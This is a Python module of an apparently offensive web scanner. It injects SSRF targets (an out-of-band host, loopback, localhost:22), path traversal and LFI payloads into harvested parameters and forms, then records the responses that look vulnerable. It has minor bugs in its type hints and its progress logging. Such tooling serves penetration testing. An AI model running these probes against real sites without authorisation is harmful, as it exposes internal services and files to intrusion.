"""
runner.py — SSRFScanner
Testa SSRF (metadata cloud + loopback), blind SSRF (OOB opcional),
Path Traversal e LFI em parâmetros extraídos do attack_surface.json.
"""

from __future__ import annotations

import base64
import json
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode

from . import payloads as P
from modules.utils.http_client import HttpClient
from modules.utils.logger import buggy_logger

# ── HTTP helpers ──────────────────────────────────────────────────────────────

def _inject_get_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_qs = urlencode(qs, doseq=True)
    return parsed._replace(query=new_qs).geturl()


def _test_ssrf_get(client: HttpClient, url: str, param: str, oob_host: str) -> dict | None:
    # Escolhe um payload OOB e um interno (ex: localhost)
    payloads = [
        f"http://{oob_host}/ssrf",
        "http://127.0.0.1",
        "http://localhost:22",
    ]
    
    for payload in payloads:
        injected_url = _inject_get_param(url, param, payload)
        # Se for oob_host, não esperamos necessariamente a resposta, mas enviamos.
        # Se for localhost, avaliamos o tempo ou a resposta
        resp = client.get(injected_url)
        
        # SSRF Refletido (ex: conteúdo da página inicial do router/localhost)
        # Se retornou 200 e tem algo estranho q n tava antes, pode ser ssrf.
        # Para fins de simplificação, só logamos o payload se disparar
        if "127.0.0.1" in payload or "localhost" in payload:
            if resp.status == 200 and ("root:x:" in resp.body or "OpenSSH" in resp.body):
                return {
                    "type": "ssrf_internal",
                    "url": injected_url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": "Internal service response detected (e.g. OpenSSH or /etc/passwd)",
                    "confidence": "high"
                }
    return None


def _test_ssrf_form(client: HttpClient, form: dict) -> dict | None:
    url    = form.get("action", "") or form.get("url", "")
    fields = form.get("fields", []) or form.get("inputs", [])
    if not url:
        return None

    for f in fields:
        name = f if isinstance(f, str) else f.get("name", "")
        if not name or name.lower() not in P.SSRF_PARAMS:
            continue
        for target in P.SSRF_TARGETS[:16]:
            resp = client.post(url, {name: target})
            if resp and any(m.lower() in resp.body.lower() for m in P.SSRF_MARKERS):
                return {
                    "type":       "ssrf",
                    "url":        url,
                    "parameter":  name,
                    "payload":    target,
                    "evidence":   "Response contains SSRF marker",
                    "confidence": "high",
                    "via":        "POST form",
                }
    return None


# ── Path Traversal ────────────────────────────────────────────────────────────

def _test_path_traversal(client: HttpClient, url: str, param: str) -> dict | None:
    for payload in P.PATH_PAYLOADS[:15]:
        injected = _inject_get_param(url, param, payload)
        resp = client.get(injected)
        if resp and any(m.lower() in resp.body.lower() for m in P.TRAVERSAL_MARKERS):
            return {
                "type":       "path_traversal",
                "url":        injected,
                "parameter":  param,
                "payload":    payload,
                "evidence":   "Response contains traversal marker",
                "confidence": "high",
            }
    return None


# ── LFI ───────────────────────────────────────────────────────────────────────

def _test_lfi(client: HttpClient, url: str, param: str) -> dict | None:
    for payload in P.LFI_PAYLOADS[:12]:
        injected = _inject_get_param(url, param, payload)
        resp = client.get(injected)
        if not resp: continue

        # Detecta marcadores diretos
        if any(m.lower() in resp.body.lower() for m in P.LFI_MARKERS):
            return {
                "type":       "lfi",
                "url":        injected,
                "parameter":  param,
                "payload":    payload,
                "evidence":   "Response contains LFI marker",
                "confidence": "high",
            }

        # Detecta base64 de PHP (php://filter)
        if "base64" in payload and len(resp.body) > 20:
            try:
                decoded = base64.b64decode(resp.body.strip()[:4096]).decode("utf-8", "ignore")
                if "<?php" in decoded or "root:x" in decoded:
                    return {
                        "type":       "lfi",
                        "url":        injected,
                        "parameter":  param,
                        "payload":    payload,
                        "evidence":   "Base64-encoded file content decoded successfully",
                        "confidence": "high",
                    }
            except Exception:
                pass

    return None


# ── Scanner principal ─────────────────────────────────────────────────────────

class SSRFScanner:
    def __init__(self, target: str, output_dir: str, oob_host: str = ""):
        self.target     = target
        self.output_dir = Path(output_dir)
        self.oob_host   = oob_host
        self.attack_dir = self.output_dir / "attacks" / "ssrf"
        self.attack_dir.mkdir(parents=True, exist_ok=True)
        self.findings: list[dict] = []

    def _load_surface(self) -> dict:
        p = self.output_dir / "surface" / "attack_surface.json"
        if p.exists():
            with open(p) as f:
                return json.load(f)
        return {}

    def _save(self):
        from modules.Report import score_bulk
        if self.findings:
            self.findings = score_bulk(self.findings)
        out = self.attack_dir / "findings.json"
        with open(out, "w") as f:
            json.dump(self.findings, f, indent=2)
        surface_file = self.output_dir / "surface" / "attack_surface.json"
        if surface_file.exists():
            with open(surface_file) as f:
                surface = json.load(f)
            surface.setdefault("ssrf_findings", []).extend(self.findings)
            with open(surface_file, "w") as f:
                json.dump(surface, f, indent=2)

    def _collect_targets(self, surface: dict) -> list[tuple[str, str, str]]:
        targets: list[tuple[str, str, str]] = []
        all_endpoints = []
        for key in ["search_endpoints", "login_pages"]:
            all_endpoints += surface.get("injection_targets", {}).get(key, [])

        for ep in all_endpoints[:40]:
            url = str(ep)
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)

            for param in qs:
                pl = param.lower()
                if pl in P.SSRF_PARAMS:
                    targets.append(("ssrf_get", url, param, self.oob_host))
                if pl in P.PATH_PARAMS:
                    targets.append(("traversal", url, param))
                    targets.append(("lfi", url, param))
        return targets

    def exec(self, threads: int = 20, timeout: float = 10.0, oob_host: str = "oob.local"):
        if oob_host:
            self.oob_host = oob_host

        buggy_logger.info(f"\n{'='*60}")
        buggy_logger.info(f"  SSRFScanner — {self.target}")
        buggy_logger.info(f"{'='*60}\n")

        surface = self._load_surface()
        if not surface:
            buggy_logger.warning("attack_surface.json não encontrado — rode surface primeiro")
            return

        client = HttpClient(timeout=timeout)
        tasks = self._collect_targets(surface)

        forms = surface.get("injection_targets", {}).get("forms", [])
        form_tasks = [(f,) for f in forms[:20]]
        buggy_logger.info(f"  [+] {len(tasks)} param tasks + 0 form tasks\n")

        def _run_task(task: tuple) -> list[dict]:
            try:
                if len(task) > 1:
                    kind = task[0]
                    if kind == "ssrf_get":
                        r = _test_ssrf_get(client, task[1], task[2], task[3])
                    elif kind == "traversal":
                        r = _test_path_traversal(client, task[1], task[2])
                    elif kind == "lfi":
                        r = _test_lfi(client, task[1], task[2])
                    else:
                        r = None
                    return [r] if r else []
                elif len(task) == 1:
                    r = _test_ssrf_form(client, task[0])
                    return [r] if r else []
            except Exception as e:
                buggy_logger.debug(f"Error in SSRF task: {e}")
            return []

        all_tasks = tasks + form_tasks  # type: ignore
        with ThreadPoolExecutor(max_workers=min(threads, 25)) as ex:
            futures = [ex.submit(_run_task, t) for t in all_tasks]
            done = 0
            for fut in as_completed(futures):
                self.findings.extend(fut.result())
                done += 1
                if done % 10 == 0:
                    buggy_logger.info(f"  ... {done}/{len(tasks)} tasks, {len(self.findings)} findings")

        self._save()

        buggy_logger.info(f"\n{'='*60}")
        buggy_logger.info(f"  ✅ SSRF scan complete — {len(self.findings)} findings")
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            count = sum(1 for f in self.findings if f.get("cvss_severity") == sev)
            if count:
                buggy_logger.info(f"     {sev}: {count}")
        buggy_logger.info(f"  📁 {self.attack_dir}/findings.json")
        buggy_logger.info(f"{'='*60}")

        return self.findings
